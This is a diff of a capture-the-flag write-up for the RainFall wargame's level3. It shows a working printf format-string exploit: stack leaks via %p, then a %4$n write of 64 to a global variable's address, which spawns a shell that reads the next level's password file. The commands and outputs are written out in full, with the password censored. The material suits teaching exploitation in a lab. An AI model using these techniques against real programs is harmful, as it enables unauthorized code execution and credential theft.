@@ -16,9 +16,9 @@ level3@RainFall:~$ ./level3
 ```
 Odd, we're getting the value of the argument of fgets and what strongly looks like stack addresses, which means....
 
-We know that the ascii of value value of 0 is `0x30`, let's try inserting a bunch of zeroes at the start of our buffer:
+Since we know that the ascii value of 0 is `0x30`, let's try inserting a bunch of 0 at the start of our buffer:
 ```shell
-level3@RainFall:~$ ./level3 <<< `python -c 'print "0000" + "%p "*10'`
+level3@RainFall:~$ python -c 'print "0000" + "%p "*10' | ./level3
 00000x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
 ```
 We can see that the 4th pointer gets modified by our printf format string as it's made of four zeroes (0x30303030), nice!
@@ -26,7 +26,7 @@ We can see that the 4th pointer gets modified by our printf format string as it'
 Let's simplify our string a bit now that we know which argument we can act on
 
 ```shell
-level3@RainFall:~$ ./level3 <<< `python -c 'print "0000%4$p"'`
+level3@RainFall:~$ python -c 'print "0000%4$p"' | ./level3
 00000x30303030
 ```
 
@@ -41,9 +41,22 @@ the value of `m` is `0x804988c`, we can get it from `gdb`, `r2`, `objdump` or gh
 
 Let's insert it as a value.
 ```shell
-level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "%4$p"'`
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%4$p"' | ./level3
 0x804988c
 ```
+
+#### note about struct.pack
+struct.pack adds extra padding as we can see with hexdump:
+
+```shell
+level3@RainFall:~$ python -c 'import struct; print struct.pack("<Q", 0x804988c) + "%4$p"' | hexdump -C
+00000000  8c 98 04 08 00 00 00 00  25 34 24 70 0a           |........%4$p.|
+0000000d
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%4$p"'  | hexdump -C
+00000000  8c 98 04 08 25 34 24 70  0a                       |....%4$p.|
+00000009
+```
+This is why we write `0x804988c` in little-endian manually.
 
 ## Modifying memory
 Now that we have access to the address of `m`, we can use `%n` to write a number to it as the BUG section of `printf` man tells us. 
@@ -52,7 +65,7 @@ The flag `%n` writes the number of character written so far to the pointer passe
 Since our format string is 4 bytes long, we need to add 60 more bytes
 
 ```shell
-./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n"'`
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' | ./level3
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
 ```
@@ -60,26 +73,13 @@ Wait what?!
 We won! we just need to find a way to keep the shell open now.
 
 ## Putting it together
-struct.pack adds extra padding as we can see with hexdump:
-```shell
-level3@RainFall:~$ python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n"' | hexdump -C
-00000000  8c 98 04 08 00 00 00 00  61 61 61 61 61 61 61 61  |........aaaaaaaa|
-00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
-*
-00000040  61 61 61 61 25 34 24 6e  0a                       |aaaa%4$n.|
-00000049
-level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' | hexdump -C
-00000000  8c 98 04 08 61 61 61 61  61 61 61 61 61 61 61 61  |....aaaaaaaaaaaa|
-00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
-*
-00000040  25 34 24 6e 0a                                    |%4$n.|
-00000045
-```
-So let's write `0x804988c` in little-endian manually.
 
+Let's send `cat` on stdin after our format string to keep the shell open
 ```shell
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' ; cat -) | ./level3
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
 cat /home/user/level4/.pass
+[censored]
 ```
+Done!
